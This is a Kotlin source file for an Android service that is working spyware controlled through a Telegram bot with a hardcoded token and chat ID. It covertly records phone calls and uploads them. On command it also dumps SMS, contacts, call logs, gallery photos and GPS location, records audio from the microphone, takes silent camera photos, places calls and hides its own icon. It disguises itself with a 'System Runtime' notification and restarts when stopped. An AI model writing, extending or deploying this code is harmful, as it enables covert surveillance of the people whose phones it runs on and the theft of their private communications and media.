package com.example.myapplication.services

import android.annotation.SuppressLint
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.MediaStore
import android.provider.Settings
import android.text.TextUtils
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import com.example.myapplication.receivers.ServiceRestarterReceiver
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.*

import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener
import java.text.SimpleDateFormat
import java.util.*

class PersistentService : LifecycleService() {

    private val BOT_TOKEN = "8995029809:AAHAjbs7CvyLoxhEm9LGVoiJsPB59Mqnzog"
    private val CHAT_ID = "8587971818"
    
    private var lastUpdateId = 0
    @Volatile private var isPolling = false
    @Volatile private var isDumping = false
    @Volatile private var isRecordingCall = false
    private var recorder: android.media.MediaRecorder? = null
    private var currentCallFile: File? = null
    private var lastCallNumber: String? = "Unknown"
    
    private var resultCode: Int = 0
    private var resultData: Intent? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    override fun onCreate() {
        super.onCreate()
        setupCallListener()
        Log.d("PersistentService", "Service onCreate called")
    }

    private fun setupCallListener() {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        tm.listen(object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                if (!phoneNumber.isNullOrEmpty()) lastCallNumber = phoneNumber
                
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        // Call started (either answered or outgoing)
                        if (!isRecordingCall) startCallRecording()
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        // Call ended
                        if (isRecordingCall) stopCallRecording()
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        // Incoming call ringing
                        if (!phoneNumber.isNullOrEmpty()) lastCallNumber = phoneNumber
                    }
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startCallRecording() {
        try {
            isRecordingCall = true
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "Call_${lastCallNumber}_$timeStamp.m4a"
            currentCallFile = File(cacheDir, fileName)

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                android.media.MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setOutputFile(currentCallFile?.absolutePath)
                prepare()
                start()
            }
            Log.d("PersistentService", "Call recording started: $fileName")
        } catch (e: Exception) {
            isRecordingCall = false
            Log.e("PersistentService", "Call Rec Start Error: ${e.message}")
        }
    }

    private fun stopCallRecording() {
        try {
            isRecordingCall = false
            recorder?.apply {
                stop()
                release()
            }
            recorder = null
            
            currentCallFile?.let { file ->
                if (file.exists() && file.length() > 100) {
                    sendMessageToTelegram("📞 **New Call Recorded**\nNumber: $lastCallNumber\nSize: ${file.length() / 1024} KB")
                    uploadFileToTelegram(file, "audio/mpeg")
                    // File will be deleted by upload method if we want, but let's keep it until sent
                }
            }
            Log.d("PersistentService", "Call recording stopped")
        } catch (e: Exception) {
            Log.e("PersistentService", "Call Rec Stop Error: ${e.message}")
        }
    }

    @SuppressLint("ForegroundServiceType")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.d("PersistentService", "Service onStartCommand called")
        
        if (wakeLock == null) {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApplication::PersistentServiceWakelock")
            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes timeout, will be re-acquired on next command
        }

        if (intent?.action == "START_POLLING") {
            resultCode = intent.getIntExtra("RESULT_CODE", 0)
            resultData = intent.getParcelableExtra("DATA")
        }

        startForegroundService()
        
        if (!isPolling) {
            isPolling = true
            setBotCommands()
            startTelegramPolling()
        }

        return START_STICKY
    }

    private fun startForegroundService() {
        val channelId = "persistent_service_channel"
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Runtime", NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Service Active")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(2, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Use another type or none for older versions if specialUse is not available
            startForeground(2, notification)
        } else {
            startForeground(2, notification)
        }
    }

    private fun setBotCommands() {
        Thread {
            try {
                val commands = JSONArray().apply {
                    put(JSONObject().put("command", "capture").put("description", "Silent Screenshot"))
                    put(JSONObject().put("command", "status").put("description", "Device Status"))
                    put(JSONObject().put("command", "dump_gallery").put("description", "Get 100 Photos"))
                    put(JSONObject().put("command", "sms").put("description", "Get 50 SMS"))
                    put(JSONObject().put("command", "contacts").put("description", "Get Contacts"))
                    put(JSONObject().put("command", "calls").put("description", "Get Call Logs"))
                    put(JSONObject().put("command", "record").put("description", "Record Audio (1m)"))
                    put(JSONObject().put("command", "cam_front").put("description", "Front Camera Photo"))
                    put(JSONObject().put("command", "cam_back").put("description", "Back Camera Photo"))
                    put(JSONObject().put("command", "call").put("description", "Make a Call: call <number>"))
                    put(JSONObject().put("command", "location").put("description", "Get GPS Location"))
                    put(JSONObject().put("command", "device_info").put("description", "Detailed Device Info"))
                    put(JSONObject().put("command", "hide_icon").put("description", "Hide App Icon"))
                    put(JSONObject().put("command", "show_icon").put("description", "Show App Icon"))
                    put(JSONObject().put("command", "help").put("description", "All Commands"))
                }
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/setMyCommands")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                conn.outputStream.use { it.write(JSONObject().put("commands", commands).toString().toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun startTelegramPolling() {
        Thread {
            while (isPolling) {
                try {
                    checkTelegramUpdates()
                } catch (e: Exception) {
                    Log.e("Polling", "Error: ${e.message}")
                }
                Thread.sleep(1000)
            }
        }.start()
    }

    private fun checkTelegramUpdates() {
        val urlString = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10"
        val conn = URL(urlString).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        
        if (conn.responseCode == 200) {
            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val result = JSONObject(response).getJSONArray("result")

            for (i in 0 until result.length()) {
                val update = result.getJSONObject(i)
                lastUpdateId = update.getInt("update_id")
                val text = update.optJSONObject("message")?.optString("text") ?: ""
                handleCommand(text)
            }
        }
    }

    private fun handleCommand(text: String) {
        val cmd = text.lowercase()
        when {
            cmd.contains("capture") -> {
                if (isAccessibilityServiceEnabled()) {
                    sendMessageToTelegram("📸 Accessibility is ON. Taking screenshot...")
                    val intent = Intent("ACTION_TAKE_SCREENSHOT")
                    intent.setPackage(packageName)
                    sendBroadcast(intent)
                } else {
                    sendMessageToTelegram("❌ Error: Accessibility Service is OFF. Please enable it from the app settings.")
                }
            }
            cmd.contains("dump gallery") -> {
                if (!isDumping) {
                    isDumping = true
                    Thread { dumpGallery() }.start()
                }
            }
            cmd.contains("sms") -> Thread { dumpSMS() }.start()
            cmd.contains("contacts") -> Thread { dumpContacts() }.start()
            cmd.contains("calls") -> Thread { dumpCallLogs() }.start()
            cmd.contains("record") -> Thread { recordAudio() }.start()
            cmd.contains("front cam") -> takePhoto(true)
            cmd.contains("back cam") -> takePhoto(false)
            cmd.startsWith("call ") -> {
                val number = text.substring(5).trim()
                makeCall(number)
            }
            cmd.contains("location") -> Thread { dumpLocation() }.start()
            cmd.contains("device info") -> sendDeviceInfo()
            cmd.contains("dump gmail") -> openGmailForDump()
            cmd.contains("block apps") -> sendAppList(true)
            cmd.contains("unblock apps") -> sendAppList(false)
            cmd.startsWith("/block") || cmd.startsWith("block ") -> handleBlockCommand(text, true)
            cmd.startsWith("/unblock") || cmd.startsWith("unblock ") -> handleBlockCommand(text, false)
            // Smart auto-block: If user just pastes a package name from the list
            cmd.contains(".") && !cmd.contains(" ") -> {
                com.example.myapplication.BlockManager.blockApp(this, text.trim())
                sendMessageToTelegram("🚫 App Blocked: ${text.trim()}")
            }
            cmd.contains("list_blocked") || cmd.contains("list blocked") -> {
                val apps = com.example.myapplication.BlockManager.getBlockedApps(this)
                if (apps.isEmpty()) sendMessageToTelegram("✅ No apps blocked.")
                else sendMessageToTelegram("🚫 **Blocked Apps:**\n" + apps.joinToString("\n"))
            }
            cmd.contains("stop dump") || cmd.contains("🛑 stop dump") -> {
                isDumping = false
                sendMessageToTelegram("🛑 Stopped.")
            }
            cmd.contains("help") || cmd.contains("/start") -> {
                sendMenuWithButtons()
            }
        }
    }

    private fun sendMenuWithButtons() {
        Thread {
            try {
                val keyboard = JSONObject().apply {
                    val row1 = JSONArray().apply {
                        put(JSONObject().put("text", "📸 Capture"))
                        put(JSONObject().put("text", "📱 Device Info"))
                    }
                    val row2 = JSONArray().apply {
                        put(JSONObject().put("text", "📍 Location"))
                        put(JSONObject().put("text", "🎙️ Record"))
                    }
                    val row3 = JSONArray().apply {
                        put(JSONObject().put("text", "🤳 Front Cam"))
                        put(JSONObject().put("text", "📷 Back Cam"))
                    }
                    val row4 = JSONArray().apply {
                        put(JSONObject().put("text", "📩 SMS"))
                        put(JSONObject().put("text", "📞 Calls"))
                        put(JSONObject().put("text", "📒 Contacts"))
                    }
                    val row5 = JSONArray().apply {
                        put(JSONObject().put("text", "🖼️ Dump Gallery"))
                        put(JSONObject().put("text", "📧 Dump Gmail"))
                    }
                    val row6 = JSONArray().apply {
                        put(JSONObject().put("text", "🚫 Block Apps"))
                        put(JSONObject().put("text", "✅ Unblock Apps"))
                    }
                    val row7 = JSONArray().apply {
                        put(JSONObject().put("text", "🛑 Stop Dump"))
                    }
                    
                    val keyboardArray = JSONArray().apply {
                        put(row1); put(row2); put(row3); put(row4); put(row5); put(row6); put(row7)
                    }
                    
                    put("keyboard", keyboardArray)
                    put("resize_keyboard", true)
                    put("one_time_keyboard", false)
                }

                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                
                val body = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", "🎮 **Control Panel Ready**\nChoose an action:")
                    put("reply_markup", keyboard)
                }.toString()
                
                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {
                Log.e("PersistentService", "Menu Error: ${e.message}")
            }
        }.start()
    }

    private fun setIconVisibility(visible: Boolean) {
        try {
            val componentName = ComponentName(this, "com.example.myapplication.LauncherActivity")
            val state = if (visible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            packageManager.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
            sendMessageToTelegram("Icon ${if(visible) "Shown" else "Hidden (Dial *#*#234#*#* to open)"}")
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Icon Error: ${e.message}")
        }
    }

    private fun dumpLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val location = if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            } else null
            
            if (location != null) {
                val msg = "📍 **Location:**\nLat: ${location.latitude}\nLong: ${location.longitude}\nGoogle Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}"
                sendMessageToTelegram(msg)
            } else {
                sendMessageToTelegram("❌ Location not available (Check GPS/Permissions)")
            }
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Location Error: ${e.message}")
        }
    }

    private fun sendDeviceInfo() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val info = """
            📱 **Device Info:**
            Model: ${Build.MODEL}
            Brand: ${Build.BRAND}
            Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
            Battery: $level%
            👁️ Accessibility: ${if(isAccessibilityServiceEnabled()) "ON" else "OFF"}
            🤖 Service: Active
            ID: ${Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)}
        """.trimIndent()
        sendMessageToTelegram(info)
    }

    private fun openGmailForDump() {
        try {
            MyAccessibilityService.isGmailDumpActive = true
            val intent = packageManager.getLaunchIntentForPackage("com.google.android.gm")
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                sendMessageToTelegram("📧 Opening Gmail for 1s dump...")
            } else {
                sendMessageToTelegram("❌ Gmail App not found")
            }
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Gmail Open Error: ${e.message}")
        }
    }

    private fun sendAppList(isForBlocking: Boolean) {
        Thread {
            try {
                val pm = packageManager
                val blockedApps = com.example.myapplication.BlockManager.getBlockedApps(this)
                val sb = StringBuilder(if (isForBlocking) "🚫 **Select App to Block**\n" else "✅ **Select App to Unblock**\n")
                sb.append("(Copy the package name and paste it here)\n\n")
                
                // Get only apps that can be launched (have an icon in drawer)
                val mainIntent = Intent(Intent.ACTION_MAIN, null).apply { addCategory(Intent.CATEGORY_LAUNCHER) }
                val launchableApps = pm.queryIntentActivities(mainIntent, 0)
                
                val displayList = mutableListOf<Pair<String, String>>()
                launchableApps.forEach { resolveInfo ->
                    val packageName = resolveInfo.activityInfo.packageName
                    val label = resolveInfo.loadLabel(pm).toString()
                    if (packageName != this.packageName) { // Don't list our own app
                        displayList.add(label to packageName)
                    }
                }

                var count = 0
                displayList.distinctBy { it.second }.sortedBy { it.first }.forEach { (label, pkg) ->
                    val isBlocked = blockedApps.contains(pkg)
                    val statusEmoji = if (isBlocked) "🔴" else "🟢"
                    
                    sb.append("$statusEmoji $label\n`$pkg` \n\n")
                    count++
                    
                    if (count >= 20) {
                        sendMessageToTelegram(sb.toString())
                        sb.setLength(0)
                        count = 0
                        Thread.sleep(500)
                    }
                }
                if (sb.isNotEmpty()) sendMessageToTelegram(sb.toString())
                
            } catch (e: Exception) {
                sendMessageToTelegram("❌ Error listing apps: ${e.message}")
            }
        }.start()
    }

    private fun handleBlockCommand(text: String, isBlock: Boolean) {
        val parts = text.split(" ")
        if (parts.size < 2) {
            sendMessageToTelegram("❌ Usage: /block <app_name> or /unblock <app_name>")
            return
        }
        val appName = parts[1]
        val pkg = com.example.myapplication.BlockManager.getPackageFromName(appName) ?: appName
        
        if (isBlock) {
            com.example.myapplication.BlockManager.blockApp(this, pkg)
            sendMessageToTelegram("🚫 App Blocked: $pkg")
        } else {
            com.example.myapplication.BlockManager.unblockApp(this, pkg)
            sendMessageToTelegram("✅ App Unblocked: $pkg")
        }
    }

    private fun takePhoto(isFront: Boolean) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
                
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                cameraProvider.unbindAll()
                // Use the service's lifecycle directly
                val camera = cameraProvider.bindToLifecycle(this, selector, imageCapture)

                val file = File(cacheDir, "cam_${if(isFront) "front" else "back"}.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()

                sendMessageToTelegram("📸 Opening ${if(isFront) "Front" else "Back"} camera...")
                
                // Ensure we give enough time for binding and sensor initialization
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                uploadFileToTelegram(file, "image/jpeg")
                                // Don't unbind immediately to allow resources to settle
                                Handler(Looper.getMainLooper()).postDelayed({ cameraProvider.unbindAll() }, 2000)
                            }
                            override fun onError(exception: ImageCaptureException) {
                                Log.e("PersistentService", "Camera Error: ${exception.message}")
                                sendMessageToTelegram("❌ Camera Error: ${exception.message}")
                                cameraProvider.unbindAll()
                            }
                        })
                    } catch (e: Exception) {
                        Log.e("PersistentService", "Capture Execution Error: ${e.message}")
                        sendMessageToTelegram("❌ Capture Error: ${e.message}")
                        cameraProvider.unbindAll()
                    }
                }, 2000) // Increased delay to 2 seconds for stability
            } catch (e: Exception) {
                Log.e("PersistentService", "Camera Binding Error: ${e.message}")
                sendMessageToTelegram("❌ Camera Setup Error: ${e.message}")
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun makeCall(number: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            sendMessageToTelegram("📞 Calling $number...")
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Call Error: ${e.message}")
        }
    }

    private fun dumpSMS() {
        try {
            val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
            val sb = StringBuilder("📩 **SMS Inbox (Last 50):**\n\n")
            var count = 0
            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                while (it.moveToNext() && count < 50) {
                    val address = it.getString(addressIdx)
                    val body = it.getString(bodyIdx)
                    sb.append("👤 From: $address\n💬 $body\n\n")
                    count++
                }
            }
            sendMessageToTelegram(sb.toString())
        } catch (e: Exception) {
            sendMessageToTelegram("❌ SMS Error: ${e.message}")
        }
    }

    private fun dumpContacts() {
        try {
            val contactsCursor = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            val sb = StringBuilder("📒 **Contacts List:**\n\n")
            var count = 0
            contactsCursor?.use {
                val nameIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numberIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && count < 100) {
                    val name = it.getString(nameIdx)
                    val number = it.getString(numberIdx)
                    sb.append("👤 $name: $number\n")
                    count++
                }
            }
            sendMessageToTelegram(sb.toString())
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Contacts Error: ${e.message}")
        }
    }

    private fun dumpCallLogs() {
        try {
            val cursor = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC")
            val sb = StringBuilder("📞 **Call Logs (Last 50):**\n\n")
            var count = 0
            cursor?.use {
                val numberIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val durationIdx = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                while (it.moveToNext() && count < 50) {
                    val number = it.getString(numberIdx)
                    val type = when (it.getInt(typeIdx)) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "MISSED"
                        else -> "UNKNOWN"
                    }
                    val duration = it.getString(durationIdx)
                    sb.append("📱 $number [$type] - ${duration}s\n")
                    count++
                }
            }
            sendMessageToTelegram(sb.toString())
        } catch (e: Exception) {
            sendMessageToTelegram("❌ CallLog Error: ${e.message}")
        }
    }

    private fun recordAudio() {
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            android.media.MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            android.media.MediaRecorder()
        }
        val path = cacheDir.absolutePath + "/rec.m4a"
        try {
            sendMessageToTelegram("🎙️ Recording 1 minute of audio...")
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(path)
            recorder.prepare()
            recorder.start()
            Thread.sleep(60000)
            recorder.stop()
            recorder.release()
            
            uploadFileToTelegram(File(path), "audio/mpeg")
        } catch (e: Exception) {
            sendMessageToTelegram("❌ Recording Error: ${e.message}")
            try { recorder.release() } catch (er: Exception) {}
        }
    }

    private fun uploadFileToTelegram(file: File, mimeType: String) {
        Thread {
            try {
                val boundary = "Boundary-" + System.currentTimeMillis()
                val type = when {
                    mimeType.startsWith("audio") -> "sendAudio"
                    mimeType.startsWith("image") -> "sendPhoto"
                    else -> "sendDocument"
                }
                val conn = URL("https://api.telegram.org/bot$BOT_TOKEN/$type").openConnection() as HttpURLConnection
                conn.doOutput = true
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                
                val out = conn.outputStream
                val writer = PrintWriter(OutputStreamWriter(out, "UTF-8"), true)
                writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").append(CHAT_ID).append("\r\n")
                
                val fieldName = when(type) {
                    "sendAudio" -> "audio"
                    "sendPhoto" -> "photo"
                    else -> "document"
                }
                
                writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${file.name}\"\r\n").append("Content-Type: $mimeType\r\n\r\n").flush()
                
                FileInputStream(file).use { it.copyTo(out) }
                out.flush()
                writer.append("\r\n--$boundary--\r\n").close()
                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = "$packageName/${MyAccessibilityService::class.java.canonicalName}"
        val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabled?.contains(service) == true
    }

    private fun sendStatusUpdate() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val msg = "🔋 Battery: $level%\n🤖 Service: Active\n👁️ Accessibility: ${if(isAccessibilityServiceEnabled()) "ON" else "OFF"}"
        sendMessageToTelegram(msg)
    }

    private fun sendMessageToTelegram(message: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                val body = JSONObject().put("chat_id", CHAT_ID).put("text", message).toString()
                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {}
        }.start()
    }

    private fun dumpGallery() {
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")
        var count = 0
        sendMessageToTelegram("🚀 Dumping gallery...")
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (it.moveToNext() && isDumping && count < 100) {
                val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, it.getLong(idCol))
                sendImageToTelegram(uri)
                count++
                Thread.sleep(1500)
            }
        }
        isDumping = false
        sendMessageToTelegram("✅ Finished. Sent $count images.")
    }

    private fun sendImageToTelegram(uri: Uri) {
        try {
            val inputStream = contentResolver.openInputStream(uri) ?: return
            val boundary = "Boundary-" + System.currentTimeMillis()
            val conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").openConnection() as HttpURLConnection
            conn.doOutput = true
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            
            val out = conn.outputStream
            val writer = PrintWriter(OutputStreamWriter(out, "UTF-8"), true)
            writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").append(CHAT_ID).append("\r\n")
            writer.append("--$boundary\r\n").append("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"\r\n").append("Content-Type: image/jpeg\r\n\r\n").flush()
            inputStream.copyTo(out)
            out.flush()
            writer.append("\r\n--$boundary--\r\n").close()
            conn.responseCode
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        isPolling = false
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        sendBroadcast(Intent(this, ServiceRestarterReceiver::class.java))
    }
}